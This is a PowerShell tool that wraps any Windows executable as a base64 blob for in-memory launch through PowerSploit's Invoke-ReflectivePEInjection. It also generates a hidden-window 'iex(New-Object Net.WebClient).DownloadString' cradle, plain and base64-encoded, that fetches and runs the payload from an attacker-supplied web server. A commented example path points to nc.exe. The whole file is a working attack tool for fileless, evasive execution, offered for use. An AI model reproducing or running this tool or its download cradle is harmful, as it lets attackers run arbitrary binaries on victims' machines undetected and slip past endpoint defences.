
#Take any exe and convert it to a complete powershell script.
#Includes commands to call and run script from remote web server"
#Uses Invoke_ReflectivePEInjection from PowerSploit"
#Binary to String conversion credit: Fabio Viggiani"
function banner {
clear-host
write-host '
                     8888888888          8888888888                                  
                     888                 888                                         
                     888                 888                                         
                     8888888    888  888 8888888                                     
                     888        `Y8bd8P'' 888                                         
                     888          X88K   888                                         
                     888        .d8""8b. 888                                         
                     8888888888 888  888 8888888888                                  
                                .d8888b.                                             
                               d88P  Y88b                                            
                                      888                                            
                                    .d88P                                            
                                .od888P"                                             
8888888b.                      d88P"                       888               888 888 
888   Y88b                     888"                        888               888 888 
888    888                     888888888                   888               888 888 
888   d88P .d88b.  888  888  888  .d88b.  888d888 .d8888b  88888b.   .d88b.  888 888 
8888888P" d88""88b 888  888  888 d8P  Y8b 888P"   88K      888 "88b d8P  Y8b 888 888 
888       888  888 888  888  888 88888888 888     "Y8888b. 888  888 88888888 888 888 
888       Y88..88P Y88b 888 d88P Y8b.     888          X88 888  888 Y8b.     888 888 
888        "Y88P"   "Y8888888P"   "Y8888  888      88888P'' 888  888  "Y8888  888 888
'



write-host "`n`n"


}

function Convert-BinaryToString {
 
  # $FilePath="c:\users\nate\documents\temp\nc.exe"
 
   $InFile = $InFile -replace '["]',''   #remove quotes from infile if they were provided
   try {
 
      $ByteArray = [System.IO.File]::ReadAllBytes($InFile);
 
   }
 
   catch {
 
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 
   }
 
   if ($ByteArray) {
 
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
 
   }
 
   else {
 
      throw '$ByteArray is $null.';
 
   }
 
   #Write-Output -InputObject $Base64String| add-content tmp.txt;
   #Write-Host  -InputObject $Base64String | out-file tmp.txt;
   return $Base64String
}

banner
$InFile = Read-Host -Prompt "Input File: "
$OutFile = Read-Host -Prompt "Output File: "
$theArgs = Read-Host -Prompt "Exe Arguments: "
$url = Read-Host -Prompt "Address for Web Server: "
$url_port = Read-Host -Prompt "Web Server Port: "


$outfileExists = test-path $OutFile
while ($outfileExists -eq $True){
    $OutFile = Read-Host -Prompt "`n$OutFile already exists, select a new output file:"
    $outfileExists = test-path $OutFile
    }


$mybin=Convert-BinaryToString
$part1= get-content Invoke_ReflectivePEInjection.ps1
Write-Output -InputObject $part1 | Add-Content $outfile
Write-Output -InputObject "`$mybin='$mybin'" | Add-Content $outfile
Write-Output -InputObject "`$PEBytes = [System.Convert]::FromBase64String(`$mybin)" | Add-Content $outfile
Write-Output -InputObject "Invoke-ReflectivePEInjection -PEBytes `$PEBytes -ExeArgs '$theArgs'" | Add-Content $outfile

$runCommand = "powershell.exe -windowstyle hidden -nop -c ""iex(New-Object Net.WebClient).DownloadString('http://$url`:$url_port/$outfile')"""


banner

write-host "[+]Success"
write-host "[+] File has been written to $outfile"

write-host "[+]Here is your command:`n"
write-host $runCommand
write-host "`n`n[+}Here is your encoded command`n"
$command = "iex(New-Object Net.WebClient).DownloadString('http://$url`:$url_port/$outfile')"  
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
write-host "powershell.exe -windowstyle hidden -nop -Enc $encodedCommand"
write-host "`n`n"
Read-Host -Prompt "Press enter to exit"

